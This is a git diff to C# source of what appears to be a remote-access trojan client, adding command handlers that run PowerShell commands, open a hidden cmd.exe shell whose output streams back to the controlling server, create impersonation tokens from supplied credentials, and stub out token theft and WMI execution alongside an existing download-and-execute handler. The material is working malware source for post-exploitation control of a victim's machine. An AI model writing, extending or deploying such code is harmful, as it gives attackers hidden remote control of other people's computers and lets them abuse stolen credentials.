@@ -1,18 +1,151 @@
 ﻿using System;
+using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
 using System.Net;
+using System.Security;
+using System.Security.Principal;
 using System.Threading;
 using System.Windows.Forms;
 using xClient.Core.Helper;
+using xClient.Core.Data;
 using xClient.Core.Networking;
 using xClient.Core.Utilities;
+using System.Runtime.InteropServices;
 
 namespace xClient.Core.Commands
 {
     /* THIS PARTIAL CLASS SHOULD CONTAIN MISCELLANEOUS METHODS. */
     public static partial class CommandHandler
     {
+        public static void HandleGetPowerPick(Packets.ServerPackets.GetPowerPick command, Client client)
+        {
+            string results;
+            bool isError = false;
+            try
+            {
+                results = PowerPickHelper.RunCommand(command.Command);
+            }
+            catch (Exception e)
+            {
+                results = e.Message;
+                isError = true;
+            }
+            new Packets.ClientPackets.GetPowerPick(results, isError).Execute(client);
+        }
+        public static void HandleDoShellImpersonate(Packets.ServerPackets.DoShellExecute command, Client client)
+        {
+            new Thread (() =>
+            {
+                if (impersonate)
+                {
+
+                    if (command.Command != "exit" && _impShell == null)
+                    {
+                        _impShell = new Process();
+                        _impShell.StartInfo.UseShellExecute = false;
+                        _impShell.StartInfo.RedirectStandardOutput = true;
+                        _impShell.StartInfo.RedirectStandardError = true;
+                        _impShell.StartInfo.RedirectStandardInput = true;
+                        //_impShell.StartInfo.UserName = "Administrator";
+                        //_impShell.StartInfo.Password = (pass);
+                        //_impShell.StartInfo.Domain = "";
+                        _impShell.StartInfo.CreateNoWindow = true;
+                        _impShell.StartInfo.FileName = "cmd.exe";
+                        _impShell.StartInfo.Arguments = "/K " + command.Command;
+                        _impShell.OutputDataReceived += (s,e)=>p_OutputDataReceived(s,e,client);
+                        _impShell.ErrorDataReceived += (s,e)=>p_ErrorDataReceived(s,e,client);
+                        _impShell.Start();
+                        _impShell.BeginOutputReadLine();
+                        _impShell.BeginErrorReadLine();
+
+                    }
+                    else if (command.Command != "exit" && _impShell != null)
+                    {
+                        _impShell.StandardInput.WriteLine(command.Command);
+                    }
+                    else if (command.Command == "exit")
+                    {
+                        _impShell.Close();
+                        _impShell = null;
+                    }
+                     if (impersonate)
+                     {
+                        WindowsAPIHelper.RevertToSelf();
+                     }
+                }
+
+
+            }).Start();
+            //Start to implement own shell that supports impersonation.
+        }
+        static void p_OutputDataReceived(object sender, DataReceivedEventArgs e, Client c)
+        {
+            string result = e.Data;
+            new xClient.Core.Packets.ClientPackets.DoShellExecuteResponse(result,true,false).Execute(c);
+        }
+        static void p_ErrorDataReceived(object sender, DataReceivedEventArgs e, Client c)
+        {
+            string error = e.Data;
+            new xClient.Core.Packets.ClientPackets.DoShellExecuteResponse(error, true, true).Execute(c);
+        }
+        public static void HandleDoEnableImpersonation(Packets.ServerPackets.DoEnableImpersonation command, Client client)
+        {
+                impersonate = command.impersonate;
+                impersonatedUser = command.user;
+        }
+        public static void HandleDoChangeToken(Packets.ServerPackets.GetChangeToken command, Client client)
+        {
+            ImpersonationSafeHandle token;
+            string guid = Guid.NewGuid().ToString();
+            if (command.technique == "steal")
+            {
+                try
+                {
+                    //TokenContextHelper.stealToken(ref token, SecurityImpersonate, ref duplicateToken, command.processID);
+                    //WindowsAPIHelper.SetThreadToken(IntPtr.Zero, duplicateToken);
+                }
+                catch
+                {
+                    //new xClient.Core.Packets.ClientPackets.GetChangeToken(false, null).Execute(client);
+                }
+            }
+            else if (command.technique == "make")
+            {
+                try
+                {
+                    string domain = "";
+                    if(string.IsNullOrEmpty(command.domain))
+                    {;
+                        domain = Environment.MachineName;
+                    }
+                    else
+                    {
+                        domain = command.domain;
+                    }
+                    token = TokenContextHelper.makeToken(command.password, command.username, domain);
+                    new xClient.Core.Packets.ClientPackets.GetChangeToken(true, domain + "\\" + command.username, guid).Execute(client);
+                    //Will this cause issues with High Integ/Med Integ tokens?
+                    impersonatedUsers.Add(guid, token);
+
+                    //Need to do manual cleanup later?
+                    GC.KeepAlive(token);
+                }
+                catch
+                {
+                    //new xClient.Core.Packets.ClientPackets.GetChangeToken(false, null).Execute(client);
+                    MessageBox.Show("failed");
+                }
+            }
+            else if (command.technique == "revToSelf")
+            {
+                WindowsAPIHelper.RevertToSelf();
+            }
+        }
+        public static void HandleDoWMIExec(Packets.ServerPackets.DoWMIExec command, Client client)
+        {
+            //ManagementClass mc = new ManagementClass(command.domain, command.command);
+        }
         public static void HandleDoDownloadAndExecute(Packets.ServerPackets.DoDownloadAndExecute command,
             Client client)
         {
@@ -80,7 +213,6 @@ namespace xClient.Core.Commands
                     throw new Exception("No executable file");
 
                 FileSplit destFile = new FileSplit(filePath);
-
                 if (!destFile.AppendBlock(command.Block, command.CurrentBlock))
                     throw new Exception(destFile.LastError);
 
